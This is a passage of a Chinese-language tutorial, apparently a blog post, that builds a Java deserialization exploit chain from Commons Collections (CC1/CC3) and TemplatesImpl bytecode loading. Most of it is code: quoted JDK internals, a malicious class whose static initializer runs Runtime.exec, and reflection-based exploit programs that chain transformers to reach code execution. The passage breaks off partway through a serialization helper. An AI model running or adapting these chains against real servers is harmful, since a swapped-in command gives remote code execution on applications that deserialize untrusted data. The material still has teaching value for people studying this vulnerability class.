+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p><code>_name</code>不能为空，同时<code>_class</code>为空。看一下这两个属性是什么：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>private</span> String _name <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>private</span> Class<span style=color:#f92672>[]</span> _class <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
+</span></span></code></pre></div><p>所以在利用的时候一定要先反射调用给<code>_name</code>赋值；而<code>_class</code>的作用是用来存放已加载的类，防止重复加载，默认值是<code>null</code>，对于一个新的<code>TemplatesImpl</code>实例来说，首次调用一定会触发<code>defineTransletClasses()</code>。</p><p>然后到<code>defineTransletClasses()</code>方法里看一下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>defineTransletClasses</span>()
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throws</span> TransformerConfigurationException {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (_bytecodes <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) {
+</span></span><span style=display:flex><span>            ErrorMsg err <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ErrorMsg(ErrorMsg.<span style=color:#a6e22e>NO_TRANSLET_CLASS_ERR</span>);
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> TransformerConfigurationException(err.<span style=color:#a6e22e>toString</span>());
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        TransletClassLoader loader <span style=color:#f92672>=</span> (TransletClassLoader)
+</span></span><span style=display:flex><span>            AccessController.<span style=color:#a6e22e>doPrivileged</span>(<span style=color:#66d9ef>new</span> PrivilegedAction() {
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>run</span>() {
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>new</span> TransletClassLoader(ObjectFactory.<span style=color:#a6e22e>findClassLoader</span>(),_tfactory.<span style=color:#a6e22e>getExternalExtensionsMap</span>());
+</span></span><span style=display:flex><span>                }
+</span></span><span style=display:flex><span>            });
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>int</span> classCount <span style=color:#f92672>=</span> _bytecodes.<span style=color:#a6e22e>length</span>;
+</span></span><span style=display:flex><span>            _class <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[</span>classCount<span style=color:#f92672>]</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (classCount <span style=color:#f92672>&gt;</span> 1) {
+</span></span><span style=display:flex><span>                _auxClasses <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;&gt;</span>();
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> 0; i <span style=color:#f92672>&lt;</span> classCount; i<span style=color:#f92672>++</span>) {
+</span></span><span style=display:flex><span>                _class<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> loader.<span style=color:#a6e22e>defineClass</span>(_bytecodes<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span>);
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>final</span> Class superClass <span style=color:#f92672>=</span> _class<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span>.<span style=color:#a6e22e>getSuperclass</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                <span style=color:#75715e>// Check if this is the main class</span>
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (superClass.<span style=color:#a6e22e>getName</span>().<span style=color:#a6e22e>equals</span>(ABSTRACT_TRANSLET)) {
+</span></span><span style=display:flex><span>                    _transletIndex <span style=color:#f92672>=</span> i;
+</span></span><span style=display:flex><span>                }
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>                    _auxClasses.<span style=color:#a6e22e>put</span>(_class<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span>.<span style=color:#a6e22e>getName</span>(), _class<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span>);
+</span></span><span style=display:flex><span>                }
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (_transletIndex <span style=color:#f92672>&lt;</span> 0) {
+</span></span><span style=display:flex><span>                ErrorMsg err<span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ErrorMsg(ErrorMsg.<span style=color:#a6e22e>NO_MAIN_TRANSLET_ERR</span>, _name);
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> TransformerConfigurationException(err.<span style=color:#a6e22e>toString</span>());
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>catch</span> (ClassFormatError e) {
+</span></span><span style=display:flex><span>            ErrorMsg err <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ErrorMsg(ErrorMsg.<span style=color:#a6e22e>TRANSLET_CLASS_ERR</span>, _name);
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> TransformerConfigurationException(err.<span style=color:#a6e22e>toString</span>());
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>catch</span> (LinkageError e) {
+</span></span><span style=display:flex><span>            ErrorMsg err <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ErrorMsg(ErrorMsg.<span style=color:#a6e22e>TRANSLET_OBJECT_ERR</span>, _name);
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> TransformerConfigurationException(err.<span style=color:#a6e22e>toString</span>());
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[][]</span> _bytecodes <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
+</span></span></code></pre></div><p>这里的<code>_bytecodes</code>的值要是一个二维数组，所以我们可以创建一个二维数组。但是<code>_bytecodes</code>作为参数传递给<code>defineClass</code>的值是一个一维数组，而这个一维数组里面要存放我们构造的恶意字节码。我们先构造一个 poc。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> org.example.Calc;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.IOException;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Calc</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>static</span> {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>            Runtime.<span style=color:#a6e22e>getRuntime</span>().<span style=color:#a6e22e>exec</span>(<span style=color:#e6db74>&#34;calc&#34;</span>);
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (IOException e) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException(e);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>把它编译一下，然后我们读取到<code>byte[]</code>中去：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> evil <span style=color:#f92672>=</span> Files.<span style=color:#a6e22e>readAllBytes</span>(Paths.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;C:\\Users\\32202\\Desktop\\CC3\\src\\main\\java\\org\\example\\Calc\\Calc.class&#34;</span>));
+</span></span><span style=display:flex><span><span style=color:#66d9ef>byte</span><span style=color:#f92672>[][]</span> code<span style=color:#f92672>=</span>{evil};
+</span></span></code></pre></div><p>回顾以下上面的源码，判断<code>_bytecodes</code>不是<code>null</code>后，就会进入下一步：自定义类加载器。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span>TransletClassLoader loader <span style=color:#f92672>=</span> (TransletClassLoader)
+</span></span><span style=display:flex><span>	AccessController.<span style=color:#a6e22e>doPrivileged</span>(<span style=color:#66d9ef>new</span> PrivilegedAction() {
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>run</span>() {
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>new</span> TransletClassLoader(ObjectFactory.<span style=color:#a6e22e>findClassLoader</span>(),_tfactory.<span style=color:#a6e22e>getExternalExtensionsMap</span>());
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>	});
+</span></span></code></pre></div><p>这个自定义类加载器的<code>TransletClassLoader</code>类型的，也是在上面解析部分讲过的链尾，继承于<code>ClassLoader</code>。来看一下这段代码中的参数：</p><p><code>ObjectFactory.findClassLoader()</code>这是<code>ObjectFactory</code>类调用了<code>findClassLoader()</code>静态方法，不需要关注。</p><p><code>_tfactory.getExternalExtensionsMap()</code>中的<code>_tfactory</code>的定义为<code>private transient TransformerFactoryImpl _tfactory = null;</code>，这个参数用<code>transient</code>修饰了，不会被序列化，无法直接修改。虽然在利用的过程没有攻击的意义，但是这个<code>_tfactory</code>不能为<code>null</code>，否则无法走到<code>defineClass</code>这一步。</p><p>接下来找找<code>_tfactory</code>其他定义。</p><p>在<code>readObject()</code>方法中，找到了<code>_tfactory</code>的初始化定义：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span>  <span style=color:#a6e22e>readObject</span>(ObjectInputStream is)
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>throws</span> IOException, ClassNotFoundException
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        SecurityManager security <span style=color:#f92672>=</span> System.<span style=color:#a6e22e>getSecurityManager</span>();
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (security <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>){
+</span></span><span style=display:flex><span>            String temp <span style=color:#f92672>=</span> SecuritySupport.<span style=color:#a6e22e>getSystemProperty</span>(DESERIALIZE_TRANSLET);
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (temp <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>||</span> <span style=color:#f92672>!</span>(temp.<span style=color:#a6e22e>length</span>()<span style=color:#f92672>==</span>0 <span style=color:#f92672>||</span> temp.<span style=color:#a6e22e>equalsIgnoreCase</span>(<span style=color:#e6db74>&#34;true&#34;</span>))) {
+</span></span><span style=display:flex><span>                ErrorMsg err <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ErrorMsg(ErrorMsg.<span style=color:#a6e22e>DESERIALIZE_TRANSLET_ERR</span>);
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> UnsupportedOperationException(err.<span style=color:#a6e22e>toString</span>());
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// We have to read serialized fields first.</span>
+</span></span><span style=display:flex><span>        ObjectInputStream.<span style=color:#a6e22e>GetField</span> gf <span style=color:#f92672>=</span> is.<span style=color:#a6e22e>readFields</span>();
+</span></span><span style=display:flex><span>        _name <span style=color:#f92672>=</span> (String)gf.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;_name&#34;</span>, <span style=color:#66d9ef>null</span>);
+</span></span><span style=display:flex><span>        _bytecodes <span style=color:#f92672>=</span> (<span style=color:#66d9ef>byte</span><span style=color:#f92672>[][]</span>)gf.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;_bytecodes&#34;</span>, <span style=color:#66d9ef>null</span>);
+</span></span><span style=display:flex><span>        _class <span style=color:#f92672>=</span> (Class<span style=color:#f92672>[]</span>)gf.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;_class&#34;</span>, <span style=color:#66d9ef>null</span>);
+</span></span><span style=display:flex><span>        _transletIndex <span style=color:#f92672>=</span> gf.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;_transletIndex&#34;</span>, <span style=color:#f92672>-</span>1);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        _outputProperties <span style=color:#f92672>=</span> (Properties)gf.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;_outputProperties&#34;</span>, <span style=color:#66d9ef>null</span>);
+</span></span><span style=display:flex><span>        _indentNumber <span style=color:#f92672>=</span> gf.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;_indentNumber&#34;</span>, 0);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (is.<span style=color:#a6e22e>readBoolean</span>()) {
+</span></span><span style=display:flex><span>            _uriResolver <span style=color:#f92672>=</span> (URIResolver) is.<span style=color:#a6e22e>readObject</span>();
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        _tfactory <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TransformerFactoryImpl();  <span style=color:#75715e>//在这！！！</span>
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>下面先使用目前的链子来构造一个初步的 exp：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> org.example;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Field;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.Files;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.Paths;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>test</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        TemplatesImpl templates <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TemplatesImpl();
+</span></span><span style=display:flex><span>        Class<span style=color:#f92672>&lt;?</span> <span style=color:#66d9ef>extends</span> TemplatesImpl<span style=color:#f92672>&gt;</span> templatesClass <span style=color:#f92672>=</span> templates.<span style=color:#a6e22e>getClass</span>();
+</span></span><span style=display:flex><span>        Field nameField <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_name&#34;</span>);
+</span></span><span style=display:flex><span>        nameField.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        nameField.<span style=color:#a6e22e>set</span>(templates,<span style=color:#e6db74>&#34;abc&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Field bytecodes <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_bytecodes&#34;</span>);
+</span></span><span style=display:flex><span>        bytecodes.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> evil <span style=color:#f92672>=</span> Files.<span style=color:#a6e22e>readAllBytes</span>(Paths.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;C:\\Users\\32202\\Desktop\\CC3\\target\\classes\\org\\example\\calcEXP\\Calc.class&#34;</span>));
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[][]</span> code<span style=color:#f92672>=</span>{evil};
+</span></span><span style=display:flex><span>        bytecodes.<span style=color:#a6e22e>set</span>(templates,code);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Field tfactory <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_tfactory&#34;</span>);
+</span></span><span style=display:flex><span>        tfactory.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        tfactory.<span style=color:#a6e22e>set</span>(templates,<span style=color:#66d9ef>new</span> TransformerFactoryImpl());
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        templates.<span style=color:#a6e22e>newTransformer</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>但是报错了，这是因为在<code>defineTransletClasses()</code>方法中还有非常重要的一步：父类检查。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>final</span> Class superClass <span style=color:#f92672>=</span> _class<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span>.<span style=color:#a6e22e>getSuperclass</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// Check if this is the main class</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (superClass.<span style=color:#a6e22e>getName</span>().<span style=color:#a6e22e>equals</span>(ABSTRACT_TRANSLET)) {
+</span></span><span style=display:flex><span>    _transletIndex <span style=color:#f92672>=</span> i;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>    _auxClasses.<span style=color:#a6e22e>put</span>(_class<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span>.<span style=color:#a6e22e>getName</span>(), _class<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span>);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>这里会判断我们构造的恶意类是否是<code>ABSTRACT_TRANSLET</code>，即<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>这个类的子类。如果不是，则会跳出程序。</p><p>所以我们让恶意类继承<code>AbstractTranslet</code>类，或者给<code>_auxClasses</code>赋值使其不为<code>null</code>。</p><h2 id=cc1-链的-templatesimpl-实现方法>CC1 链的 TemplatesImpl 实现方法
+<a class=anchor href=#cc1-%e9%93%be%e7%9a%84-templatesimpl-%e5%ae%9e%e7%8e%b0%e6%96%b9%e6%b3%95>#</a></h2><p>TemplatesImpl 只是将原本的命令执行变成代码执行的方式，所以在不考虑黑名单的情况下，如果可以进行命令执行，则一定可以通过动态加载字节码进行代码执行。</p><p>所以在 CC1 链中只要把最后的命令执行方式修改一下就可以了。</p><p>初步的 exp：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> org.example;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.Transformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.ChainedTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.ConstantTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.InvokerTransformer;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Field;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.Files;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.Paths;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>test</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        TemplatesImpl templates <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TemplatesImpl();
+</span></span><span style=display:flex><span>        Class<span style=color:#f92672>&lt;?</span> <span style=color:#66d9ef>extends</span> TemplatesImpl<span style=color:#f92672>&gt;</span> templatesClass <span style=color:#f92672>=</span> templates.<span style=color:#a6e22e>getClass</span>();
+</span></span><span style=display:flex><span>        Field nameField <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_name&#34;</span>);
+</span></span><span style=display:flex><span>        nameField.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        nameField.<span style=color:#a6e22e>set</span>(templates,<span style=color:#e6db74>&#34;abc&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Field bytecodes <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_bytecodes&#34;</span>);
+</span></span><span style=display:flex><span>        bytecodes.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> evil <span style=color:#f92672>=</span> Files.<span style=color:#a6e22e>readAllBytes</span>(Paths.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;C:\\Users\\32202\\Desktop\\CC3\\target\\classes\\org\\example\\calcEXP\\Calc.class&#34;</span>));
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[][]</span> code<span style=color:#f92672>=</span>{evil};
+</span></span><span style=display:flex><span>        bytecodes.<span style=color:#a6e22e>set</span>(templates,code);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Field tfactory <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_tfactory&#34;</span>);
+</span></span><span style=display:flex><span>        tfactory.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        tfactory.<span style=color:#a6e22e>set</span>(templates,<span style=color:#66d9ef>new</span> TransformerFactoryImpl());
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//templates.newTransformer();</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Transformer<span style=color:#f92672>[]</span> transformers <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]</span>{
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> ConstantTransformer(templates),
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;newTransformer&#34;</span>,<span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span>,<span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span>)
+</span></span><span style=display:flex><span>        };
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        ChainedTransformer chainedTransformer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ChainedTransformer(transformers);
+</span></span><span style=display:flex><span>        chainedTransformer.<span style=color:#a6e22e>transform</span>(1);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>成功弹出计算器，接下来把 CC1 的前半段放进去：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> org.example;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.javafx.collections.MappingChange;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.Transformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.ChainedTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.ConstantTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.InvokerTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.map.TransformedMap;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileInputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileOutputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.ObjectInputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.ObjectOutputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.annotation.Retention;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Constructor;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Field;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.Files;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.Paths;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.HashMap;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Map;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>test</span> {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>serialize</span>(Object obj) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>        ObjectOutputStream oos <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream(<span style=color:#66d9ef>new</span> FileOutputStream(<span style=color:#e6db74>&#34;ser.bin&#34;</span>));
+</span></span><span style=display:flex><span>        oos.<span style=color:#a6e22e>writeObject</span>(obj);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
